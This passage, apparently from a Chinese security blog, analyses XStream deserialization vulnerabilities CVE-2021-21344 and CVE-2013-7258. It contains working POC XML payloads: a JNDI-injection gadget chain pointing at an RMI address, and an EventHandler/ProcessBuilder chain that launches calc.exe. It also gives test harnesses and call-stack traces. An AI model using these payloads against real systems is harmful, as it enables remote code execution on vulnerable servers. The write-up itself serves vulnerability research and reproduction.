                      <span class="nt">&lt;readOnly&gt;</span>true<span class="nt">&lt;/readOnly&gt;</span>
                      <span class="nt">&lt;rowSetType&gt;</span>1004<span class="nt">&lt;/rowSetType&gt;</span>
                      <span class="nt">&lt;showDeleted&gt;</span>false<span class="nt">&lt;/showDeleted&gt;</span>
                      <span class="nt">&lt;dataSource&gt;</span>rmi://localhost:7777/exec<span class="nt">&lt;/dataSource&gt;</span>
                      <span class="nt">&lt;params/&gt;</span>
                    <span class="nt">&lt;/default&gt;</span>
                  <span class="nt">&lt;/javax.sql.rowset.BaseRowSet&gt;</span>
                  <span class="nt">&lt;com.sun.rowset.JdbcRowSetImpl&gt;</span>
                    <span class="nt">&lt;default&gt;</span>
                      <span class="nt">&lt;iMatchColumns&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                        <span class="nt">&lt;int&gt;</span>-1<span class="nt">&lt;/int&gt;</span>
                      <span class="nt">&lt;/iMatchColumns&gt;</span>
                      <span class="nt">&lt;strMatchColumns&gt;</span>
                        <span class="nt">&lt;string&gt;</span>foo<span class="nt">&lt;/string&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                        <span class="nt">&lt;null/&gt;</span>
                      <span class="nt">&lt;/strMatchColumns&gt;</span>
                    <span class="nt">&lt;/default&gt;</span>
                  <span class="nt">&lt;/com.sun.rowset.JdbcRowSetImpl&gt;</span>
                <span class="nt">&lt;/jaxbObject&gt;</span>
              <span class="nt">&lt;/dataSource&gt;</span>
            <span class="nt">&lt;/message&gt;</span>
            <span class="nt">&lt;satellites/&gt;</span>
            <span class="nt">&lt;invocationProperties/&gt;</span>
          <span class="nt">&lt;/packet&gt;</span>
        <span class="nt">&lt;/indexMap&gt;</span>
      <span class="nt">&lt;/comparator&gt;</span>
    <span class="nt">&lt;/default&gt;</span>
    <span class="nt">&lt;int&gt;</span>3<span class="nt">&lt;/int&gt;</span>
    <span class="nt">&lt;string&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="nt">&lt;/string&gt;</span>
    <span class="nt">&lt;string&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="nt">&lt;/string&gt;</span>
  <span class="nt">&lt;/java.util.PriorityQueue&gt;</span>
<span class="nt">&lt;/java.util.PriorityQueue&gt;</span>
</pre></div>
<p>测试文件：里面的xml为上面的POC</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">com.thoughtworks.xstream.XStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CVE202121344</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">XStream</span> <span class="n">xStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XStream</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">xml</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
        <span class="n">xStream</span><span class="o">.</span><span class="na">fromXML</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><strong>分析</strong>：<br/>
第一：java.util.PriorityQueue<br/>
根据POC的根节点使用的是PriorityQueue，这也是链的第一步，在反序列化的过程中会调用其readObject函数<br/>
在CC2中了解到此链的触发点是comparator的compare函数，POC中将compara设置成sun.awt.datatransfer.DataTransferer$IndexOrderComparator<br/>
第二：sun.awt.datatransfer.DataTransferer<br/>
成功设置comparator后，在调用PriorityQueue函数的siftDownUsingComparator方法后，会成功跳转至DataTransferer的compare方法，接着后面的某段链没了解过<br/>
第三：com.sun.rowset.JdbcRowSetImpl<br/>
来到JdbcRowSetImpl的getDatabaseMetaData方法,在里面它调用connect方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">DatabaseMetaData</span> <span class="nf">getDatabaseMetaData</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">Connection</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
    <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">getMetaData</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>此链在fastjson中使用过，查看其connect方法</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">Connection</span> <span class="nf">connect</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">conn</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">conn</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getDataSourceName</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">InitialContext</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
            <span class="n">DataSource</span> <span class="n">var2</span> <span class="o">=</span> <span class="o">(</span><span class="n">DataSource</span><span class="o">)</span><span class="n">var1</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getDataSourceName</span><span class="o">());</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)</span> <span class="o">?</span> <span class="n">var2</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getPassword</span><span class="o">())</span> <span class="o">:</span> <span class="n">var2</span><span class="o">.</span><span class="na">getConnection</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">SQLException</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">resBundle</span><span class="o">.</span><span class="na">handleGetObject</span><span class="o">(</span><span class="s">"jdbcrowsetimpl.connect"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">getUrl</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getUrl</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getPassword</span><span class="o">())</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>这里通过JNDI去lookup存放在属性dataSource的地址，在上面的POC中我们将dataSource设置成了恶意的rmi地址<br/>
第四步：JNDI注入<br/>
接下来的过程就是JNDI注入的那一套了<br/>
<strong>函数调用栈</strong></p>
<div class="highlight"><pre><span></span><span class="nl">getObjectFactoryFromReference:</span><span class="mi">142</span><span class="o">,</span> <span class="n">NamingManager</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">spi</span><span class="o">)</span>
<span class="nl">getObjectInstance:</span><span class="mi">319</span><span class="o">,</span> <span class="n">NamingManager</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">spi</span><span class="o">)</span>
<span class="nl">decodeObject:</span><span class="mi">464</span><span class="o">,</span> <span class="n">RegistryContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">registry</span><span class="o">)</span>
<span class="nl">lookup:</span><span class="mi">124</span><span class="o">,</span> <span class="n">RegistryContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">registry</span><span class="o">)</span>
<span class="nl">lookup:</span><span class="mi">205</span><span class="o">,</span> <span class="n">GenericURLContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">toolkit</span><span class="o">.</span><span class="na">url</span><span class="o">)</span>
<span class="nl">lookup:</span><span class="mi">417</span><span class="o">,</span> <span class="n">InitialContext</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">)</span>
<span class="nl">connect:</span><span class="mi">624</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">)</span>
<span class="nl">getDatabaseMetaData:</span><span class="mi">4004</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">get:</span><span class="mi">343</span><span class="o">,</span> <span class="n">Accessor$GetterSetterReflection</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">serializeURIs:</span><span class="mi">402</span><span class="o">,</span> <span class="n">ClassBeanInfoImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">runtime</span><span class="o">)</span>
<span class="nl">childAsXsiType:</span><span class="mi">662</span><span class="o">,</span> <span class="n">XMLSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">runtime</span><span class="o">)</span>
<span class="nl">write:</span><span class="mi">256</span><span class="o">,</span> <span class="n">MarshallerImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">runtime</span><span class="o">)</span>
<span class="nl">marshal:</span><span class="mi">89</span><span class="o">,</span> <span class="n">BridgeImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">runtime</span><span class="o">)</span>
<span class="nl">marshal:</span><span class="mi">130</span><span class="o">,</span> <span class="n">Bridge</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">api</span><span class="o">)</span>
<span class="nl">marshal:</span><span class="mi">161</span><span class="o">,</span> <span class="n">BridgeWrapper</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">db</span><span class="o">.</span><span class="na">glassfish</span><span class="o">)</span>
<span class="nl">writeTo:</span><span class="mi">109</span><span class="o">,</span> <span class="n">JAXBAttachment</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">message</span><span class="o">)</span>
<span class="nl">asInputStream:</span><span class="mi">99</span><span class="o">,</span> <span class="n">JAXBAttachment</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">message</span><span class="o">)</span>
<span class="nl">getInputStream:</span><span class="mi">125</span><span class="o">,</span> <span class="n">JAXBAttachment</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">message</span><span class="o">)</span>
<span class="nl">getMessage:</span><span class="mi">366</span><span class="o">,</span> <span class="n">XMLMessage$XMLMultiPart</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">encoding</span><span class="o">.</span><span class="na">xml</span><span class="o">)</span>
<span class="nl">getAttachments:</span><span class="mi">465</span><span class="o">,</span> <span class="n">XMLMessage$XMLMultiPart</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">encoding</span><span class="o">.</span><span class="na">xml</span><span class="o">)</span>
<span class="nl">getAttachments:</span><span class="mi">103</span><span class="o">,</span> <span class="n">MessageWrapper</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">api</span><span class="o">.</span><span class="na">message</span><span class="o">)</span>
<span class="nl">get:</span><span class="mi">111</span><span class="o">,</span> <span class="n">ResponseContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">client</span><span class="o">)</span>
<span class="nl">compareIndices:</span><span class="mi">2492</span><span class="o">,</span> <span class="n">DataTransferer$IndexedComparator</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">awt</span><span class="o">.</span><span class="na">datatransfer</span><span class="o">)</span>
<span class="nl">compare:</span><span class="mi">2970</span><span class="o">,</span> <span class="n">DataTransferer$IndexOrderComparator</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">awt</span><span class="o">.</span><span class="na">datatransfer</span><span class="o">)</span>
<span class="nl">siftDownUsingComparator:</span><span class="mi">721</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">siftDown:</span><span class="mi">687</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">heapify:</span><span class="mi">736</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">795</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">callReadObject:</span><span class="mi">132</span><span class="o">,</span> <span class="n">SerializationMembers</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">doUnmarshal:</span><span class="mi">443</span><span class="o">,</span> <span class="n">SerializableConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">reflection</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">277</span><span class="o">,</span> <span class="n">AbstractReflectionConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">reflection</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">72</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">72</span><span class="o">,</span> <span class="n">AbstractReferenceUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">66</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">50</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">start:</span><span class="mi">134</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">32</span><span class="o">,</span> <span class="n">AbstractTreeMarshallingStrategy</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1409</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1388</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">1273</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">1264</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">112</span><span class="o">,</span> <span class="n">CVE202121344</span> <span class="o">(</span><span class="n">Xstream</span><span class="o">)</span>
</pre></div>
<h2 data-content="1" id="4d0307defd91ea62eee736e833703191">5. CVE-2013-7258</h2>
<p><strong>影响版本</strong>：1.4.x-1.4.6及1.4.10<br/>
<strong>测试环境</strong>：XStream1.4.5 JDK1.8_66<br/>
<strong>复现</strong>：<br/>
POC</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;sorted-set&gt;</span>
    <span class="nt">&lt;string&gt;</span>foo<span class="nt">&lt;/string&gt;</span>
    <span class="nt">&lt;dynamic-proxy&gt;</span>
        <span class="nt">&lt;interface&gt;</span>java.lang.Comparable<span class="nt">&lt;/interface&gt;</span>
        <span class="nt">&lt;handler</span> <span class="na">class=</span><span class="s">"java.beans.EventHandler"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;target</span> <span class="na">class=</span><span class="s">"java.lang.ProcessBuilder"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;command&gt;</span>
                    <span class="nt">&lt;string&gt;</span>cmd<span class="nt">&lt;/string&gt;</span>
                    <span class="nt">&lt;string&gt;</span>/C<span class="nt">&lt;/string&gt;</span>
                    <span class="nt">&lt;string&gt;</span>calc.exe<span class="nt">&lt;/string&gt;</span>
                <span class="nt">&lt;/command&gt;</span>
            <span class="nt">&lt;/target&gt;</span>
            <span class="nt">&lt;action&gt;</span>start<span class="nt">&lt;/action&gt;</span>
        <span class="nt">&lt;/handler&gt;</span>
    <span class="nt">&lt;/dynamic-proxy&gt;</span>
<span class="nt">&lt;/sorted-set&gt;</span>
</pre></div>
<p>测试文件：里面的XML为上面的POC</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.thoughtworks.xstream.XStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CVE20137258</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">XStream</span> <span class="n">xStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XStream</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">xml</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
        <span class="n">xStream</span><span class="o">.</span><span class="na">fromXML</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><strong>分析</strong>：<br/>
根据前面的fromXML的流程，单步执行至TreeUnmarshaller的start函数</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">start</span><span class="o">(</span><span class="n">DataHolder</span> <span class="n">dataHolder</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">dataHolder</span> <span class="o">=</span> <span class="n">dataHolder</span><span class="o">;</span>
    <span class="c1">// 根据XML的根标签获取对应的class</span>
    <span class="n">Class</span> <span class="n">type</span> <span class="o">=</span> <span class="n">HierarchicalStreams</span><span class="o">.</span><span class="na">readClassType</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">reader</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">mapper</span><span class="o">);</span>
    <span class="c1">// 将对应的class转换成Java对象</span>
    <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">convertAnother</span><span class="o">((</span><span class="n">Object</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="n">type</span><span class="o">);</span>
    <span class="n">Iterator</span> <span class="n">validations</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">validationList</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>

    <span class="k">while</span><span class="o">(</span><span class="n">validations</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">Runnable</span> <span class="n">runnable</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runnable</span><span class="o">)</span><span class="n">validations</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">runnable</span><span class="o">.</span><span class="na">run</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>进入readClassType函数</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">Class</span> <span class="nf">readClassType</span><span class="o">(</span><span class="n">HierarchicalStreamReader</span> <span class="n">reader</span><span class="o">,</span> <span class="n">Mapper</span> <span class="n">mapper</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">classAttribute</span> <span class="o">=</span> <span class="n">readClassAttribute</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">mapper</span><span class="o">);</span>
    <span class="n">Class</span> <span class="n">type</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">classAttribute</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 根据节点名从mapper中得到对应的type</span>
        <span class="n">type</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="na">realClass</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">getNodeName</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">type</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="na">realClass</span><span class="o">(</span><span class="n">classAttribute</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">type</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>进入realClass函数:com\thoughtworks\xstream\mapper\CachingMapper.class</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Class</span> <span class="nf">realClass</span><span class="o">(</span><span class="n">String</span> <span class="n">elementName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// 获取根元素</span>
    <span class="n">Object</span> <span class="n">cached</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">realClassCache</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">elementName</span><span class="o">);</span>
    <span class="c1">// 如果realClassCache中存在，直接返回即可</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">cached</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">cached</span> <span class="k">instanceof</span> <span class="n">Class</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span><span class="n">cached</span><span class="o">;</span>
